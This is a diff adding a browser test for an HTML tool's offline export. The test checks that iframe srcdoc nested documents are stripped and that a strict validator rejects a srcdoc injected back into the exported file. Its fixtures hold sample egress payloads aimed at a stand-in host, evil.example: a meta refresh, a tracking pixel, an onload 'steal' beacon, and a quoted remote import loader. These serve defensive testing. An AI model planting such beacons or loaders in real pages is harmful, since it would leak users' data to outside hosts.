@@ -2823,6 +2823,185 @@ test("CMH-OFFLINE-04: hyperlink auditing and an SVG feImage are stripped from an
   }
 });
 
+const SRCDOC_NESTED = [
+  '<meta http-equiv="refresh" content="0;url=https://evil.example/refresh">',
+  '<img src="https://evil.example/pixel.png" alt="p">',
+  '<body onload="new Image().src = \'https://evil.example/steal\'">',
+].join("");
+
+function srcdocAttr(markup) {
+  return markup.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
+}
+
+const SRCDOC_CONTENT = [
+  "<h1>Nested srcdoc document</h1>",
+  '<p id="srcdoc-note">A srcdoc carries a whole document inside an attribute value.</p>',
+  // The bug: this nested document really does load, refresh, and beacon, and NEITHER side of the
+  // offline contract could see it - the strip walks elements (nothing descends into a string) and
+  // the validator's tag index reads the markup below as attribute TEXT, never as tags.
+  `<iframe id="cmh-srcdoc-beacon" title="beacon" srcdoc="${srcdocAttr(SRCDOC_NESTED)}"></iframe>`,
+  // The same shapes every other offline pass is held to: a template-parked frame a script can
+  // adopt, a <noscript> fallback the reader who cannot run the layer really parses, and a
+  // self-closed FOREIGN element - all of which the strip's walk reaches and the gate's index
+  // records, so both sides must judge them alike.
+  `<template id="cmh-srcdoc-template"><iframe srcdoc="${srcdocAttr(SRCDOC_NESTED)}"></iframe></template>`,
+  `<noscript><iframe id="cmh-srcdoc-noscript" srcdoc="${srcdocAttr(SRCDOC_NESTED)}"></iframe></noscript>`,
+  `<svg width="1" height="1"><iframe id="cmh-srcdoc-foreign" srcdoc="${srcdocAttr(SRCDOC_NESTED)}"/></svg>`,
+  // An EMPTY nested document loads nothing, and it goes too: the strip clears the attribute on
+  // presence, so a value-inspecting gate would bless a file the export still changes.
+  '<iframe id="cmh-srcdoc-empty" title="empty" srcdoc=""></iframe>',
+  // ...and no further. A frame that carries no nested document is ordinary content: the ELEMENT,
+  // its title and its relative src all survive intact.
+  '<iframe id="cmh-srcdoc-keep" title="keep" src="beacon.html"></iframe>',
+].join("\n");
+
+// Every frame that still carries a nested document, read by PARSING the exported bytes in the
+// browser rather than by regex: the export embeds the whole layer runtime, whose own source comment
+// and toast string spell `<iframe srcdoc>` in plain text, and a text scan would read those as
+// elements (a script body is text to a parser, so parsing needs no fragile strip pass). Templates
+// are walked because their content is an inert fragment `querySelectorAll` cannot reach. Parsed
+// with scripting OFF, exactly as the exporter's own DOMParser is, so a `<noscript>` fallback frame
+// is seen too. The independent oracle is the `--strict` run below, whose tokenizer shares nothing
+// with this.
+async function iframeSrcdocValues(page, html) {
+  return page.evaluate((source) => {
+    const doc = new DOMParser().parseFromString(source, "text/html");
+    const found = [];
+    const walk = function (root) {
+      root.querySelectorAll("iframe").forEach(function (f) {
+        if (f.hasAttribute("srcdoc")) found.push(f.getAttribute("srcdoc"));
+      });
+      root.querySelectorAll("template").forEach(function (t) { if (t.content) walk(t.content); });
+    };
+    walk(doc);
+    return found;
+  }, html);
+}
+
+test("CMH-OFFLINE-04: an iframe srcdoc carries a nested document neither the strip nor the gate can inspect", async ({ page, browser }) => {
+  test.setTimeout(90000);
+  const staged = stageContent(SRCDOC_CONTENT, { key: "cmh-offline-srcdoc", source: "offline-srcdoc.html" });
+  const outDir = makeTmpDir();
+  let ctx2;
+  let ctx3;
+  try {
+    const sourceRequests = [];
+    await page.route(/^https?:\/\//, async (route) => {
+      sourceRequests.push(route.request().url());
+      await route.abort();
+    });
+    await installDownloadTextCapture(page);
+    await page.goto(fileUrl(staged.html));
+    await ready(page);
+    // The bug, pinned on the SOURCE document: the nested document is live - it fetches, and its
+    // meta refresh navigates the frame - so this is egress an offline export must not carry.
+    await expect.poll(() => sourceRequests.filter((u) => u.includes("evil.example")).length,
+      { message: "the nested srcdoc document must really reach the network" }).toBeGreaterThan(0);
+    // ...and the positive control for the reader below: it finds all five nested documents in the
+    // source, so an empty result after the export is a strip that ran, not a blind helper.
+    expect(await iframeSrcdocValues(page, fs.readFileSync(staged.html, "utf8")),
+      "the srcdoc reader must see the frames the source really carries").toHaveLength(5);
+
+    await openToolbarMenu(page);
+    await Promise.all([
+      page.waitForEvent("download"),
+      page.locator("#btnExportOfflineTop").click(),
+    ]);
+    const exportedHtml = await capturedDownloadText(page);
+
+    expect(await iframeSrcdocValues(page, exportedHtml), "no srcdoc may survive an offline export").toEqual([]);
+    expect(exportedHtml, "the nested document must leave with the attribute").not.toContain("evil.example");
+    // Cleared, not deleted: the frames themselves are content, and so is a relative src.
+    for (const id of ["cmh-srcdoc-beacon", "cmh-srcdoc-template", "cmh-srcdoc-noscript",
+      "cmh-srcdoc-foreign", "cmh-srcdoc-empty", "cmh-srcdoc-keep"]) {
+      expect(exportedHtml, `${id} must be kept as an element`).toContain(`id="${id}"`);
+    }
+    expect(exportedHtml).toContain('src="beacon.html"');
+    expect(exportedHtml).toContain('title="keep"');
+    expect(networkLoadRefs(exportedHtml)).toEqual([]);
+    // Removing a nested document removes content that WORKED offline, so unlike a network strip it
+    // must not be silent. 5 = the beacon, template-parked, noscript-parked, foreign and empty
+    // frames above; the srcdoc-free control is not counted.
+    await expect(page.locator("#toast")).toContainText(
+      "5 <iframe srcdoc> nested documents were removed - an offline export cannot inspect a document carried inside an attribute.");
+
+    const exportedPath = path.join(outDir, "offline-srcdoc.html");
+    fs.writeFileSync(exportedPath, exportedHtml);
+    // The gate must agree with the strip: a file the exporter cleans is offline-clean to --strict.
+    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });
+    // ...and the other direction, which the clean file alone cannot prove: re-inject a srcdoc into
+    // the EXPORTED file and the gate must reject it, so a hand-authored offline document cannot
+    // keep what the strip takes away.
+    const reinjectedPath = path.join(outDir, "offline-srcdoc-reinjected.html");
+    const reinjectedHtml = exportedHtml.replace(
+      '<iframe id="cmh-srcdoc-keep"',
+      `<iframe id="cmh-srcdoc-reinjected" srcdoc="${srcdocAttr(SRCDOC_NESTED)}"></iframe>\n<iframe id="cmh-srcdoc-keep"`);
+    expect(reinjectedHtml, "the srcdoc must actually have been re-injected").not.toEqual(exportedHtml);
+    fs.writeFileSync(reinjectedPath, reinjectedHtml);
+    // Pinned to the SRCDOC rule, not merely to a non-zero exit: an exit-code-only assertion would
+    // be satisfied by any future rule that rejected this file for an unrelated reason, which is
+    // exactly how a fail-open regression in the check under test would go unnoticed.
+    let reinjectedFailure = null;
+    try {
+      execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", reinjectedPath], { cwd: SKILL, stdio: "pipe" });
+    } catch (err) {
+      reinjectedFailure = String(err.stdout || "") + String(err.stderr || "");
+    }
+    expect(reinjectedFailure, "--strict must reject a re-injected srcdoc").not.toBeNull();
+    expect(reinjectedFailure).toContain("<iframe srcdoc=");
+    expect(reinjectedFailure).toContain("carries a nested document");
+
+    ctx2 = await browser.newContext();
+    const page2 = await ctx2.newPage();
+    const external = [];
+    await page2.route(/^https?:\/\//, async (route) => {
+      external.push(route.request().url());
+      await route.abort();
+    });
+    await page2.goto(fileUrl(exportedPath));
+    await ready(page2);
+    // Adopt every parked fragment, so a template-parked frame would genuinely get its chance to
+    // load its nested document.
+    await page2.evaluate(() => {
+      document.querySelectorAll("template").forEach((t) => {
+        document.body.appendChild(document.importNode(t.content, true));
+      });
+    });
+    expect(await page2.evaluate(() => [...document.querySelectorAll("iframe")].filter((f) => f.hasAttribute("srcdoc")).length)).toBe(0);
+    expect(external).toEqual([]);
+
+    // The strip is the layer that must not DEPEND on the CSP, so prove it alone: the same export
+    // with its zero-network policy removed must still reach no network. Without this the browser
+    // evidence above is satisfied even if the strip did nothing.
+    const noCspPath = path.join(outDir, "offline-srcdoc-no-csp.html");
+    const cspMetaRe = /<meta\b[^>]*http-equiv=["']Content-Security-Policy["'][^>]*>/gi;
+    expect((exportedHtml.match(cspMetaRe) || []).length, "the export must carry a CSP meta").toBeGreaterThan(0);
+    const noCspHtml = exportedHtml.replace(cspMetaRe, "");
+    expect(noCspHtml.match(cspMetaRe), "every CSP meta must actually have been removed").toBeNull();
+    fs.writeFileSync(noCspPath, noCspHtml);
+    ctx3 = await browser.newContext();
+    const page3 = await ctx3.newPage();
+    const externalNoCsp = [];
+    await page3.route(/^https?:\/\//, async (route) => {
+      externalNoCsp.push(route.request().url());
+      await route.abort();
+    });
+    await page3.goto(fileUrl(noCspPath));
+    await ready(page3);
+    await page3.evaluate(() => {
+      document.querySelectorAll("template").forEach((t) => {
+        document.body.appendChild(document.importNode(t.content, true));
+      });
+    });
+    expect(externalNoCsp).toEqual([]);
+  } finally {
+    if (ctx2) await ctx2.close();
+    if (ctx3) await ctx3.close();
+    fs.rmSync(staged.dir, { recursive: true, force: true });
+    fs.rmSync(outDir, { recursive: true, force: true });
+  }
+});
+
 const QUOTED_EGRESS_NOTE = 'Please drop the import("https://evil.example/x.js") loader and the '
   + 'location.href = "https://evil.example/steal" beacon before we ship this.';
 
